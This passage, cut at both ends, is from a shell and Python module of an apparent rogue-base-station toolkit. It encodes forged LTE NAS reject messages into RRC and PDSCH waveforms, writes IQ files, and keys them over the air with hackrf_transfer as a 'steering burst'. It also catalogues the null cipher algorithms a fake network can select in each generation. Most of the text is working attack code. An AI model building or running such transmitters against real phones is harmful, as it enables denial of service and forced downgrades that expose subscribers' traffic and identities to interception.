#     octet string carries a length determinant, which unaligned PER writes in
#     the normally-small form: 1 bit saying the length fits the next 7 bits,
#     then those 7 bits (3 octets is 0 0000011); then the 24 payload bits.
#
# Total: 5 + 2 + 1 + 2 + 1 + 2 + 8 + 24 = 45 bits (one more per extra NAS
# octet). The NAS payload therefore lands at a FIXED bit offset of 21, and the
# check that matters is that an outside decoder reads the NAS octets back out.
# This layout is asserted bit for bit against pycrate's DL-DCCH-Message in the
# selftest; it is not taken on faith here.
dwn_lte_rrc_transfer() {
    local nas_hex="${1:-}" tx="${2:-0}" syms="${3:-head}"
    [[ "$nas_hex" =~ ^[0-9A-Fa-f]+$ && $(( ${#nas_hex} % 2 )) -eq 0 ]] || {
        printf 'ERROR\tdwn_lte_rrc_transfer needs an even-length hex NAS PDU\n' >&2
        return 2; }
    [[ "$tx" =~ ^[0-9]$ ]] || tx=0
    python3 - "$nas_hex" "$tx" "$syms" <<'PY'
import sys
nas_hex, tx, syms = sys.argv[1].upper(), int(sys.argv[2]), sys.argv[3]
nas = bytes.fromhex(nas_hex)
if not 1 <= len(nas) <= 127:
    sys.stderr.write("ERROR\tNAS PDU must be 1..127 octets, got %d\n" % len(nas))
    raise SystemExit(1)

# TS 36.331 10.5: DL-DCCH-Message/message/c1 index 1 = dlInformationTransfer.
pre = "0" + format(1, "04b")
txb = format(tx, "02b")
crit = "0"                       # criticalExtensions CHOICE: c1
c1 = "00"                        # c1 CHOICE: dlInformationTransfer-r8
r8ext = "0"                      # r8-IEs extension bit: no extension additions
dtype = "00"                     # dedicatedInfoType CHOICE: dedicatedInfoNAS
nslen = "0" + format(len(nas), "07b")   # normally-small length determinant
payload = "".join(format(b, "08b") for b in nas)
inner = txb + crit + c1 + r8ext + dtype + nslen + payload
body = pre + inner
pad = -len(body) % 8
raw = bytes(int((body + "0" * pad)[i:i + 8], 2)
            for i in range(0, len(body) + pad, 8))

# Where the octet string starts, counted from the first bit of the message.
nas_off = len(pre) + len(txb) + len(crit) + len(c1) + len(r8ext) + len(dtype) \
    + len(nslen)
back = body[nas_off:nas_off + len(payload)]
print("rrc_message\tDLInformationTransfer")
print("rrc_message_type\t0x%02X" % 0x34)
print("channel\tDL-DCCH on PDSCH")
print("rrc_layout\tTS 36.331 10.5/6.2.2 unaligned PER")
print("dl_dcch_prefix\t%s" % pre)
print("dl_dcch_prefix_dec\t1")
print("rrc_tx_id\t%d" % tx)
print("dedicated_info_type\tdedicatedInfoNAS")
print("nas_len_octets\t%d" % len(nas))
print("nas_ldet_bits\t%d" % len(nslen))
print("nas_hex\t%s" % nas_hex)
print("nas_bits\t%d" % len(payload))
print("nas_bit_offset\t%d" % nas_off)
print("inner_bits\t%d" % len(inner))
print("dl_dcch_bits\t%d" % len(body))
print("dl_dcch_pad_bits\t%d" % pad)
print("dl_dcch_octets\t%d" % len(raw))
print("dl_dcch_hex\t%s" % raw.hex().upper())
print("dl_dcch_bits_hex\t%s" % body)
# The transmission block is the RRC PDU itself: the PDU was built at the true
# bit length, so no filler is needed on the way in.
print("tb_hex\t%s" % raw.hex().upper())
print("tb_bits\t%d" % len(body))
# Read the NAS octets straight back out of the finished bit string. This is a
# self-consistency check of the layout, not the independent one (that is the
# pycrate arm in the selftest).
print("nas_readback_hex\t%s" % "".join(
    "%02X" % int(back[i:i + 8], 2) for i in range(0, len(back), 8)))
PY
}

# ── the downlink transmit path ──────────────────────────────────────────
# The reject above is a NAS message, and a NAS message does not go on the air
# by itself. It rides in an RRC DLInformationTransfer on DL-DCCH (built by
# dwn_lte_rrc_transfer), and that RRC PDU is a transport block: CRC24A ->
# code-block segmentation -> turbo coding -> rate matching -> scrambling ->
# QPSK -> layer mapping -> precoding -> resource-element mapping -> OFDM.
#
# Every stage of that chain is tools/lte_phy.py, which is a transcription of
# srsRAN_4G's C asserted stage by stage in its own selftest and end to end
# against srsran_dlsch_encode2()/srsran_pdsch_encode() driven from that C
# (tools/lte-phy-oracle/pdsch_dump.c). The composed entry point used here is
# pdsch_encode(), which returns every intermediate so the numbers below are
# read out of the chain rather than recomputed beside it. Nothing in this
# module re-implements a PHY stage, so there is only one place for the
# arithmetic to be wrong and it is not this file.
#
# What this module owns is the part no single stage test sees: that the
# transport block IS the RRC PDU at its true bit length, that the symbols land
# in the REs the grant actually has, that the resulting samples are one
# millisecond of baseband, and that the cyclic prefixes are where TS 36.211
# 6.12 says they are. Those are checked here (dwn_lte_chain_script) and the
# checks are mutation-tested in the selftest.
dwn_lte_phy_ok() {
    [[ -r "$IMSISTING_ROOT/tools/lte_phy.py" ]]
}

# The chain driver. Prints `<key>\t<value>` rows and exits non-zero, with the
# reason on stderr, if any stage refuses -- including the waveform checks.
dwn_lte_chain_script() {
    local dst="$1"
    cat > "$dst" <<'DWN_PHY'
"""The downlink transmit path for one NAS reject, as number rows.

argv: <tb-hex> <tb-bits> <rnti> <cell> <subframe> <n_rb> <cfi> <ports>
      <iq-dir> <symbols-mode>
"""
import importlib.util
import math
import os
import struct
import sys

ROOT = os.environ.get("IMSISTING_ROOT") or "."
_spec = importlib.util.spec_from_file_location(
    "lte_phy", os.path.join(ROOT, "tools", "lte_phy.py"))
P = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(P)


def h2b(h):
    return [(int(c, 16) >> (3 - i)) & 1 for c in h for i in range(4)]


def b2h(bits):
    pad = (-len(bits)) % 4
    bits = list(bits) + [0] * pad
    return "".join("%X" % (bits[i] << 3 | bits[i + 1] << 2
                           | bits[i + 2] << 1 | bits[i + 3])
                   for i in range(0, len(bits), 4))


def main(argv):
    hexs, nbits = argv[0], int(argv[1])
    rnti, cell, sf, n_rb, cfi, ports = (int(x) for x in argv[2:8])
    iq_dir = argv[8]
    syms = argv[9] if len(argv) > 9 else "head"

    out = []

    def row(k, v):
        out.append("%s\t%s" % (k, v))

    bits = h2b(hexs)
    if nbits > len(bits):
        sys.stderr.write("ERROR\t--bitlen %d exceeds %d hex bits\n"
                         % (nbits, len(bits)))
        return 1
    tb = bits[:nbits]
    row("tb_bits", len(tb))

    # TS 36.211 6.12: the FFT size and the sample rate follow from N_RB, and
    # the waveform is generated at that rate. Nothing resamples it later: a
    # driver that cannot run at this rate gets a named error rather than a
    # stretched signal, because a stretched waveform still "transmits".
    p = P.ofdm_params(n_rb)
    n_fft, fs, n_sc = p["n_fft"], p["sample_rate"], p["n_sc"]
    row("ofdm_bandwidth_mhz", p["bandwidth_mhz"])
    row("ofdm_n_rb", p["n_rb"])
    row("ofdm_n_fft", n_fft)
    row("ofdm_sample_rate_hz", fs)
    row("ofdm_n_sc", n_sc)

    # The grant: which REs the PDSCH may use, in mapping order, with the
    # control region of slot 0 and the cell-specific references removed.
    re_by_slot = [P.pdsch_available_re(n_rb, cell, sf, s, ports, False,
                                       False, None, cfi)
                  for s in (0, 1)]
    nof_re = sum(len(r) for r in re_by_slot)
    row("re_slot0", len(re_by_slot[0]))
    row("re_slot1", len(re_by_slot[1]))
    row("nof_re", nof_re)

    crc_stream = P.lte_crc_attach(tb, "24a")
    row("tb_with_crc_bits", len(crc_stream))
    row("tb_crc24a_hex", "0x" + b2h(P.crc_bits(tb, "24a")))

    # The whole chain, in one call, at G = nof_re * Qm.
    enc = P.pdsch_encode(tb, "qpsk", rnti, cell, sf, nof_re, ports, 1)
    info = enc["info"]
    cbs = info["cbs"]
    row("cb_count", info["segmentation"]["C"])
    row("turbo_k", len(cbs[0]))
    row("filler_bits", len(cbs[0]) - len(crc_stream))
    row("turbo_bits", len(P.turbo_encode(cbs[0], len(cbs[0]))))
    row("e_per_cb", ",".join(str(x) for x in info["e_per_cb"]))
    row("e_bits", len(enc["e"]))
    row("rm_reused_blocks", int(math.ceil(len(enc["e"])
                                          / float(3 * (len(cbs[0]) + 4)))))
    row("c_init", enc["c_init"])
    row("scrambled_bits", len(enc["scrambled"]))
    row("qpsk_symbols", len(enc["symbols"]))
    row("port_symbols", len(enc["ports"][0]))
    row("rho_a", "%.6f" % enc["rho_a"])

    # A mapper that cannot be inverted on its own output is broken in a way
    # every length check passes, so it is inverted once here -- against the
    # SCRAMBLED bits the modulator was actually fed, which is not the same
    # sequence as e and is the comparison that makes this check mean anything.
    if P.demodulate(enc["symbols"], "qpsk") != enc["scrambled"]:
        sys.stderr.write("ERROR\tQPSK modulator is not invertible on its "
                         "own output\n")
        return 1
    row("qpsk_roundtrip", "ok")

    # TS 36.211 6.4: onto the grid, in the same order pdsch_available_re()
    # hands out, one slot at a time. pdsch_map writes at the SYMBOL INDEX OF
    # THE SLOT, so the two slots need two grids and then a stack: mapping the
    # second slot into the same rows overlaps the first and the mapper refuses
    # it (which is how this was found). pdsch_map also refuses an RE that is
    # already written, so a mapping-order mistake is an error, not an overlap.
    # precode_layers() returns a stream PER PORT, so for one port the symbols
    # are ports[0] and not ports. Reading the outer list is the mistake that
    # makes a length check compare the port count against the RE count.
    if ports != 1:
        sys.stderr.write("ERROR\t%d ports needs a PMI codebook, which "
                         "tools/lte_phy.py does not implement\n" % ports)
        return 1
    streams = enc["ports"]
    if len(streams) != 1:
        sys.stderr.write("ERROR\texpected 1 port stream, got %d\n"
                         % len(streams))
        return 1
    symbols = streams[0]
    if len(symbols) != nof_re:
        sys.stderr.write("ERROR\t%d REs need %d symbols, got %d\n"
                         % (nof_re, nof_re, len(symbols)))
        return 1
    n0 = len(re_by_slot[0])
    grid = []
    for slot in (0, 1):
        sub = [[None] * (n_rb * 12) for _ in range(7)]
        P.pdsch_map(sub, symbols[:n0] if slot == 0 else symbols[n0:],
                    n_rb, cell, sf, slot, ports, False, False, None,
                    cfi if slot == 0 else 0)
        grid.extend(sub)
    row("symbols_mapped", sum(1 for r in grid for v in r if v is not None))

    # TS 36.211 6.12: subcarrier mapping (DC bin left empty), inverse
    # transform, cyclic prefix. Two slots make the 1 ms subframe.
    flat = [[0j if v is None else complex(v) for v in r] for r in grid]
    samples, lengths = P.ofdm_modulate(flat, n_fft, False, 2)
    cps = P.cp_lengths(n_fft, False) * 2
    row("cp_samples", ",".join(str(c) for c in cps[:3])
        + (",..." if len(cps) > 3 else ""))
    row("symbol_samples_first", "%d,%d" % (lengths[0], lengths[1]))
    row("slot_samples", P.slot_samples(n_fft))
    row("subframe_samples", len(samples))

    want = 2 * P.slot_samples(n_fft)
    if len(samples) != want:
        sys.stderr.write("ERROR\tthe waveform is %d samples; one millisecond "
                         "at %d Hz is %d\n" % (len(samples), fs, want))
        return 1

    # The prefix of every symbol must be a copy of that symbol's last samples,
    # at the offset the grid implies. This is the one property that says the
    # buffer is an OFDM waveform and not simply the right length.
    off = 0
    for i, ln in enumerate(lengths):
        c = cps[i]
        for j in range(c):
            if abs(samples[off + j] - samples[off + n_fft + j]) > 1e-9:
                sys.stderr.write("ERROR\tsymbol %d prefix is not the tail of "
                                 "its body\n" % i)
                return 1
        off += ln
    row("cp_identity", "ok")

    peak = max(abs(s) for s in samples)
    if peak <= 0:
        sys.stderr.write("ERROR\tthe waveform is all zeros\n")
        return 1
    mean = sum(abs(s) ** 2 for s in samples) / len(samples)
    row("peak", "%.6f" % peak)
    row("mean_power", "%.6f" % mean)
    row("papr_db", "%.3f" % (10.0 * math.log10(peak * peak / mean)))

    # The two sample formats a driver's own CLI reads. cs8 is what
    # hackrf_transfer reads; sc16 is the bladeRF/Lime/USRP format. Both are
    # written from the same complex buffer, scaled by the peak so neither
    # clips, and the file is read back so the byte counts are measured.
    os.makedirs(iq_dir, exist_ok=True)
    cs8 = bytearray()
    sc16 = bytearray()
    for s in samples:
        cs8 += bytes((int(round(s.real / peak * 127.0)) & 0xFF,
                      int(round(s.imag / peak * 127.0)) & 0xFF))
        sc16 += struct.pack("<hh",
                            int(round(s.real / peak * 32767.0)),
                            int(round(s.imag / peak * 32767.0)))
    for name, blob in (("cs8", cs8), ("sc16", sc16)):
        path = os.path.join(iq_dir, "dwn_reject_lte." + name)
        with open(path, "wb") as fh:
            fh.write(bytes(blob))
        back = open(path, "rb").read()
        if len(back) != len(blob):
            sys.stderr.write("ERROR\t%s is %d bytes on disk, %d written\n"
                             % (path, len(back), len(blob)))
            return 1
        row("iq_%s_path" % name, path)
        row("iq_%s_bytes" % name, len(back))
    row("iq_samples", len(samples))
    row("iq_seconds", "%.6f" % (len(samples) / float(fs)))

    if syms == "all":
        idx = range(len(enc["symbols"]))
    else:
        var = len(enc["symbols"])
        idx = list(range(min(8, var))) + \
            list(range(max(8, var - 4), var))
    for i in idx:
        v = enc["symbols"][i]
        row("sym", "%d\t%d\t%.6f%+.6fi" % (i, i // 12, v.real, v.imag))
    row("symbols_shown", "%d of %d (DWN_TX_SYMBOLS=all for every one)"
        % (len(list(idx)), len(enc["symbols"])))

    sys.stdout.write("\n".join(out) + "\n")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except (ValueError, IndexError) as exc:
        sys.stderr.write("ERROR\t%s\n" % exc)
        sys.exit(1)
DWN_PHY
}

# Run the chain, leaving its rows in <dest>. Non-zero, with the chain's own
# error text on stderr, when a stage refuses.
dwn_lte_chain_build() {
    local hex="$1" nbits="$2" dst="$3"
    local py="$MOD_TMP/downlink_chain.py"
    # Written every run, not cached on size: the driver is a heredoc inside
    # this file, so a cached copy is the previous version of this file. A
    # stale driver is the one failure that looks exactly like success.
    mkdir -p "$MOD_TMP" || return 1
    dwn_lte_chain_script "$py" || return 1
    IMSISTING_ROOT="$IMSISTING_ROOT" python3 "$py" "$hex" "$nbits" \
        "${DWN_TX_RNTI:-0}" "${DWN_TX_CELL:-1}" "${DWN_TX_SF:-1}" \
        "${DWN_TX_RB:-6}" "${DWN_TX_CFI:-1}" "${DWN_TX_PORTS:-1}" \
        "${DWN_TX_IQ_DIR:-$DWN_DIR/iq}" "${DWN_TX_SYMBOLS:-head}" > "$dst"
}

# One field out of a `<key>\t<value>` row, first match wins. The here-string
# matters: the chain output is thousands of rows and `printf | awk` exits on
# the first match, so the write after that is a broken pipe every time.
dwn_ltef() {
    awk -F'\t' -v k="$2" '$1==k{print $2; exit}' <<< "$1"
}

# The transmit call for a driver's own CLI, or non-zero when this module has no
# verified call for it. Only the hackrf call is built in: hackrf_transfer's
# transmit syntax is the one this tree already runs in modules/07_gsm_attack.sh
# and modules/12_nr_air.sh. No syntax is invented for drivers this host cannot
# exercise -- an operator supplies DWN_TX_CMD for those, and the output says so
# instead of printing a plausible-looking line nobody has ever run.
#
# The sample rate is checked against a driver's range before the call is
# offered. hackrf_transfer resamples in the CPLD between 2 and 20 Msps, so the
# 1.92..30.72 Msps an LTE carrier runs at fits, but a driver whose range does
# not cover the waveform's rate gets a named error rather than a stretched
# signal: the waveform is generated at N_FFT * 15 kHz and this module never
# resamples it.
dwn_lte_rate_ok() {
    local drv="${1:-}" rate="${2:-}"
    [[ "$rate" =~ ^[0-9]+$ ]] || return 1
    case "$drv" in
        hackrf) (( rate >= 2000000 && rate <= 20000000 )) ;;
        *) return 0 ;;   # operator-supplied call: their driver, their range
    esac
}

dwn_lte_tx_call() {
    local drv="${1:-}" iq="${2:-}" rate="${3:-}" freq="${4:-}" gain="${5:-}"
    [[ -n "$drv" && -n "$iq" && -n "$rate" && -n "$freq" ]] || return 1
    case "$drv" in
        hackrf)
            # -t I/Q file, -f centre Hz, -s sample rate, -a 1 RF amp, -x TX VGA
            printf 'hackrf_transfer -t %s -f %s -s %s -a 1 -x %s' \
                   "$iq" "$freq" "$rate" "$gain" ;;
        *) return 1 ;;
    esac
}

# ── dwn_tx_reject: the whole downlink, and an honest answer about the radio ──
# <rat> <cause> [attach|tau|service]. Prints every number as a value and only
# claims a transmission when a driver answered a probe AND its command ran.
# With no radio it prints ERROR plus WHY on stderr and returns non-zero, with
# no success line on stdout.
dwn_tx_reject() {
    local rat="${1:-5GMM}" cause="${2:-22}" kind="${3:-attach}"
    local nas; nas=$(dwn_nas_reject_build "$rat" "$cause" "$kind") || {
        printf 'ERROR\tno such reject: %s cause %s (%s)\n' \
               "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$cause")" \
               "$(dwn_sanitize "$kind")" >&2
        return 2; }
    local nas_hex nas_bits nas_name
    nas_hex=$(dwn_ltef "$nas" msg_hex)
    nas_bits=$(dwn_ltef "$nas" msg_bits)
    nas_name=$(dwn_ltef "$nas" name)

    local rrc; rrc=$(dwn_lte_rrc_transfer "$nas_hex" "${DWN_TX_RRC_TX:-0}") || {
        printf 'ERROR\tthe DL-DCCH wrapper refused the NAS PDU\n' >&2
        return 1; }
    local rrc_hex rrc_bits rrc_octets tb_bits
    rrc_hex=$(dwn_ltef "$rrc" dl_dcch_hex)
    rrc_bits=$(dwn_ltef "$rrc" dl_dcch_bits)
    rrc_octets=$(dwn_ltef "$rrc" dl_dcch_octets)
    # The transport block is the octet-aligned RRC PDU, NOT its ASN.1 bit
    # length. TS 36.212 5.1.1 takes A from the TBS table of TS 36.213
    # Table 7.1.7.2.1-1, and every entry there is a multiple of 8, so a
    # transport block of 53 bits is not a size that exists: the three bits the
    # PER encoder added to reach an octet boundary are transmitted with the
    # PDU. Passing the ASN.1 length instead is what makes a chain ask for
    # filler bits -- the tree refuses those ("srsRAN 23.11 refuses them too"),
    # and it is right to: at every standard TBS the filler count is zero, so a
    # caller asking for filler has the length wrong, not the chain.
    tb_bits=$(( rrc_octets * 8 ))

    printf 'rat\t%s\n' "$rat"
    printf 'cause\t%s\n' "$cause"
    printf 'cause_name\t%s\n' "$nas_name"
    printf 'nas_msg_type\t%s\n' "$(dwn_ltef "$nas" msg_type_hex)"
    printf 'nas_msg_name\t%s\n' "$(dwn_ltef "$nas" msg_name)"
    printf 'nas_hex\t%s\n' "$nas_hex"
    printf 'nas_bits\t%s\n' "$nas_bits"
    printf 'rrc_message\t%s\n' "$(dwn_ltef "$rrc" rrc_message) on DL-DCCH"
    printf 'rrc_tx_id\t%s\n' "$(dwn_ltef "$rrc" rrc_tx_id)"
    printf 'rrc_hex\t%s\n' "$rrc_hex"
    printf 'rrc_bits\t%s\n' "$rrc_bits"
    printf 'rrc_octets\t%s\n' "$rrc_octets"
    printf 'rrc_pad_bits\t%s\n' "$(dwn_ltef "$rrc" dl_dcch_pad_bits)"
    printf 'tb_bits\t%s\n' "$tb_bits"

    if ! dwn_lte_phy_ok; then
        printf 'ERROR\tthe PHY chain needs tools/lte_phy.py, which is not readable under %s\n' \
               "$(dwn_sanitize "$IMSISTING_ROOT")" >&2
        return 1
    fi

    local chain="$MOD_TMP/tx_chain.tsv"
    mkdir -p "$MOD_TMP"
    if ! dwn_lte_chain_build "$rrc_hex" "$tb_bits" "$chain"; then
        printf 'ERROR\tthe downlink PHY chain refused this transport block\n' >&2
        return 1
    fi
    local o; o=$(cat "$chain")
    local k
    for k in ofdm_bandwidth_mhz ofdm_n_rb ofdm_n_fft ofdm_sample_rate_hz \
             ofdm_n_sc re_slot0 re_slot1 nof_re tb_bits tb_with_crc_bits \
             tb_crc24a_hex cb_count turbo_k filler_bits turbo_bits e_bits \
             rm_reused_blocks c_init scrambled_bits qpsk_symbols port_symbols \
             rho_a qpsk_roundtrip symbols_mapped cp_samples slot_samples \
             subframe_samples cp_identity peak mean_power papr_db iq_samples \
             iq_cs8_path iq_cs8_bytes iq_sc16_path iq_sc16_bytes iq_seconds \
             symbols_shown; do
        printf '%s\t%s\n' "$k" "$(dwn_ltef "$o" "$k")"
    done
    local n=0 s
    while IFS= read -r s; do
        [[ -n "$s" ]] || continue
        printf 'sym\t%s\n' "$s"
        n=$(( n + 1 ))
    done < <(awk -F'\t' '$1=="sym"{sub(/^sym\t/,""); print}' <<< "$o")

    # The grant that carries this PDSCH. Format 1 for a C-RNTI, 1A for the
    # fallback, and the aggregation level follows from the CCEs the control
    # region has room for.
    local phy="$IMSISTING_ROOT/tools/lte_phy.py" rb="${DWN_TX_RB:-6}"
    local cell="${DWN_TX_CELL:-1}" ports="${DWN_TX_PORTS:-1}" sf="${DWN_TX_SF:-1}"
    local cfi="${DWN_TX_CFI:-1}" rnti="${DWN_TX_RNTI:-0}"
    local dci_fmt=1 dci_size agg cce_have regs_line
    regs_line=$(python3 "$phy" regs --n-rb "$rb" --cell "$cell" --ports "$ports" 2>/dev/null \
                | awk -F'\t' -v k="pdcch-cfi$cfi" '$1==k{print $2; exit}')
    cce_have=$(printf '%s' "$regs_line" | sed -n 's/.*, *\([0-9]*\) *CCEs\?.*/\1/p')
    dci_size=$(python3 "$phy" dci-size "$dci_fmt" --n-rb "$rb" --ports "$ports" 2>/dev/null)
    [[ "$dci_size" =~ ^[0-9]+$ ]] || {
        dci_fmt=1A
        dci_size=$(python3 "$phy" dci-size 1A --n-rb "$rb" --ports "$ports" 2>/dev/null); }
    [[ "$dci_size" =~ ^[0-9]+$ ]] || dci_size=0
    case "$dci_fmt" in 0|1A|1) agg=2 ;; 2) agg=4 ;; 3) agg=8 ;; esac
    printf 'dci_format\t%s\n' "$dci_fmt"
    printf 'dci_bits\t%s\n' "$dci_size"
    printf 'pdcch_aggregation\t%s\n' "$agg"
    printf 'pdcch_cce_available\t%s\n' "${cce_have:-0}"
    printf 'pdcch_cce_needed\t%s\n' "$agg"
    if [[ "${cce_have:-0}" =~ ^[0-9]+$ ]] && (( cce_have >= agg )) \
       && (( dci_size > 0 )); then
        printf 'pdcch_fits\t1\n'
    else
        printf 'pdcch_fits\t0\n'
    fi
    local dci_hex pdc pdc_hex
    dci_hex=$(printf '%0*X' $(( ((dci_size + 7) / 8) * 2 )) 0)
    pdc=$(python3 "$phy" pdcch "$dci_hex" --rnti "$rnti" --bits "$dci_size" \
              --format "$dci_fmt" --ncce 0 --cell "$cell" --subframe "$sf" 2>/dev/null)
    pdc_hex="${pdc%% *}"
    if [[ "$pdc_hex" =~ ^[0-9A-Fa-f]+$ ]]; then
        # lte_phy.py pdcch prints one hex digit PER CODED BIT, so the digit
        # count is the coded length: aggregation level 2 is 2 CCEs, a CCE is
        # 36 REGs and a REG carries 8 coded bits, so 72 whatever the DCI is.
        printf 'pdcch_hex\t%s\n' "$pdc_hex"
        printf 'pdcch_bits\t%d\n' "${#pdc_hex}"
    else
        printf 'pdcch_hex\t-\n'
        printf 'pdcch_bits\t0\n'
    fi

    # Timing and burst structure. A DLInformationTransfer is one transport
    # block in one subframe; a steering burst is that subframe repeated, and
    # the repetition count is stated rather than implied.
    local freq="${DWN_TX_FREQ_HZ:-1842500000}" gain="${DWN_TX_GAIN_DB:-0}"
    local reps="${DWN_TX_BURST_SUBFRAMES:-1}" rate sps
    rate=$(dwn_ltef "$o" ofdm_sample_rate_hz)
    sps=$(dwn_ltef "$o" subframe_samples)
    [[ "$reps" =~ ^[0-9]+$ ]] && (( reps >= 1 )) || reps=1
    [[ "$gain" =~ ^-?[0-9]+$ ]] || gain=0
    printf 'tx_subframe_ms\t1\n'
    printf 'tx_slots\t2\n'
    printf 'tx_symbols\t14\n'
    printf 'tx_burst_subframes\t%s\n' "$reps"
    printf 'tx_burst_ms\t%s\n' "$reps"
    printf 'tx_burst_samples\t%d\n' "$(( sps * reps ))"
    printf 'tx_centre_freq_hz\t%s\n' "$freq"
    printf 'tx_gain_db\t%s\n' "$gain"
    printf 'tx_sample_rate_hz\t%s\n' "$rate"
    printf 'tx_iq_format\tcs8\n'
    if [[ -n "${DWN_TX_FREQ_HZ:-}" ]]; then
        printf 'tx_centre_source\tDWN_TX_FREQ_HZ\n'
    else
        printf 'tx_centre_source\tdefault band 3 EARFCN 1650 = 1842.5 MHz (not probed from any network; set DWN_TX_FREQ_HZ to change it)\n'
    fi

    # The radio. A driver binary on PATH is not a radio, so the device is
    # asked (dwn_find_tx_sdr), and DWN_SDR_DEVICE overrides the answer.
    local dev
    if ! dev=$(dwn_find_tx_sdr); then
        printf 'tx_device\tnone\n' >&2
        printf 'tx_mode\tnone\n' >&2
        printf 'ERROR\tno SDR device: %s did not answer a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' \
               "$(dwn_sanitize "$DWN_SDR")" >&2
        printf 'WHY\tthe baseband chain above is real and its waveform is on disk, but keying it needs a radio; a driver package being installed is not a radio, so the probe asks the driver rather than the PATH; set DWN_SDR_DEVICE=<driver> to force a named device, or DWN_TX_CMD for a driver this module has no built-in call for\n' >&2
        return 1
    fi
    printf 'tx_device\t%s\n' "$(dwn_sanitize "$dev")"
    printf 'tx_mode\tradio\n'
    local iq; iq=$(dwn_ltef "$o" iq_cs8_path)
    if ! dwn_lte_rate_ok "$dev" "$rate"; then
        printf 'ERROR\t%s cannot run at %s Hz, and this waveform is generated at N_FFT * 15 kHz and never resampled\n' \
               "$(dwn_sanitize "$dev")" "$(dwn_sanitize "$rate")" >&2
        return 1
    fi
    local cmd
    if [[ -n "${DWN_TX_CMD:-}" ]]; then
        cmd="$DWN_TX_CMD"
        printf 'sdr_call\tshell: %s\n' "$(dwn_sanitize "$cmd")"
    elif ! cmd=$(dwn_lte_tx_call "$dev" "$iq" "$rate" "$freq" "$gain"); then
        printf 'ERROR\tno built-in transmit call for %s -- set DWN_TX_CMD\n' \
               "$(dwn_sanitize "$dev")" >&2
        return 1
    else
        printf 'sdr_call\t%s\n' "$(dwn_sanitize "$cmd")"
    fi
    printf 'sdr_iq\t%s\n' "$iq"
    printf 'sdr_iq_format\tcs8\n'
    printf 'sdr_centre_hz\t%s\n' "$freq"
    printf 'sdr_gain_db\t%s\n' "$gain"
    local rc=0
    timeout 120 bash -c "$cmd" >/dev/null 2>&1 || rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tthe SDR call failed (rc %s): %s\n' "$rc" \
               "$(dwn_sanitize "$cmd")" >&2
        return 1
    fi
    printf 'TX\tqueued to %s (%s Hz, %s PRB, burst %s subframe(s))\n' \
           "$(dwn_sanitize "$dev")" "$rate" "$rb" "$reps"
}

# ── null cipher identifiers ─────────────────────────────────────────────
# Every generation has an "encryption off" algorithm, and in each case the
# network is permitted to select it. A Security Mode Command naming the null
# algorithm is accepted by a UE that should have refused it.
#   rat:alg:cipher_name:integrity_name:type:bits:exposes
dwn_null_ciphers() {
    cat << 'EOF'
# 5G / NR — TS 33.501 5.5.2, TS 24.501 9.11.3.34
NR:NEA0:NEA0 (null ciphering):NIA0 (null integrity):both:4:no confidentiality and no integrity on NAS and AS
NR:NEA1:SNOW3G:NIA1:128-eea1:4:legacy stream cipher, 128-bit key
NR:NEA2:AES-CTR:NIA2:128-eea2:4:AES-based, the normal choice
NR:NEA3:ZUC:NIA3:128-eea3:4:Chinese stream cipher
# LTE / EPC — TS 33.401 5.4.2
LTE:EEA0:EEA0 (null ciphering):EIA0 (null integrity):both:4:no confidentiality; EIA0 only for unauthenticated emergency
LTE:EEA1:SNOW3G:EIA1:128-eea1:4:legacy stream cipher
LTE:EEA2:AES-CTR:EIA2:128-eea2:4:AES-based, the normal choice
LTE:EEA3:ZUC:EIA3:128-eea3:4:optional in EPS
# UMTS / UTRAN — TS 33.102 6.6
UMTS:UEA0:UEA0 (null ciphering):UIA0 (null integrity):both:4:no confidentiality on the radio bearer
UMTS:UEA1:KASUMI:UIA1:kasumi:4:KASUMI is broken in practice
UMTS:UEA2:SNOW3G:UIA2:128-uea2:4:stronger than KASUMI
# GSM / GERAN — TS 43.020, TS 44.018
GSM:A5/0:A5/0 (no ciphering):none:both:0:the IMSI and all traffic are in the clear
GSM:A5/1:A5/1:A5/1:both:64:64-bit key, broken by a known-plaintext attack in minutes
GSM:A5/2:A5/2:A5/2:both:64:weaker than A5/1, trivially broken
GSM:A5/3:A5/3:A5/3:both:64:the strongest GSM cipher, still only 64-bit
EOF
}

dwn_null_table() {
    printf 'rat\talg\tcipher\tintegrity\tbits\texposes\n'
    dwn_null_ciphers | grep -v '^#' | awk -F: '{printf "%s\t%s\t%s\t%s\t%s\t%s\n", $1,$2,$3,$4,$6,$7}'
}

# Every generation must have its null algorithm present. Returns the rows.
dwn_null_for_rat() {
    local rat="${1:-}"
    dwn_null_ciphers | grep -v '^#' | awk -F: -v r="$rat" '$1==r'
}

dwn_is_null_alg() {
    local alg="${1:-}"
    case "${alg^^}" in
        NEA0|NIA0|EIA0|EEA0|UIA0|UEA0|A5/0|A50|NULL|NONE) return 0 ;;
        *) return 1 ;;
    esac
}

# The assigned algorithm identifiers, per generation, as PUBLISHED.
# Ciphering and integrity are separate 4-bit fields and either may be null
# while the other is not — that asymmetry is the whole point of this module.
#
#   TS 33.501 §5.11.1.1  NR: NEA0..NEA3 = 0..3, NIA0..NIA3 = 0..3
#   TS 33.401 §5.1.4     EPS: EEA0..EEA3 = 0..3, EIA0..EIA3 = 0..3
#   TS 33.102 §6.6       UMTS: UEA0..UEA2 = 0..2, UIA0..UIA2 = 0..2
#   TS 43.020 / 44.018   GSM: A5/0..A5/3 = 0..3, no integrity algorithm
# The NR values (NEA0=0x00 .. NEA3=0x03, NIA0=0x00 .. NIA3=0x03) are
# independently confirmed against the Go NAS library's security/parameters.go,
# which cites TS 33.501 5.11.1.1 for exactly these constants.
dwn_alg_id() {
    local alg="${1:-}"
    case "${alg^^}" in
        NEA0|NIA0|EEA0|EIA0|UEA0|UIA0|A5/0|A50) echo 0 ;;
        NEA1|NIA1|EEA1|EIA1|UEA1|UIA1|A5/1|A51) echo 1 ;;
        NEA2|NIA2|EEA2|EIA2|UEA2|UIA2|A5/2|A52) echo 2 ;;
        NEA3|NIA3|EEA3|EIA3|A5/3|A53)           echo 3 ;;
        *) return 1 ;;
    esac
}

# True when the name is a CIPHERING algorithm (not an integrity one).
dwn_is_cipher_alg() {
    case "${1^^}" in
        NEA0|NEA1|NEA2|NEA3|EEA0|EEA1|EEA2|EEA3|UEA0|UEA1|UEA2|A5/0|A50|A5/1|A51|A5/2|A52|A5/3|A53) return 0 ;;
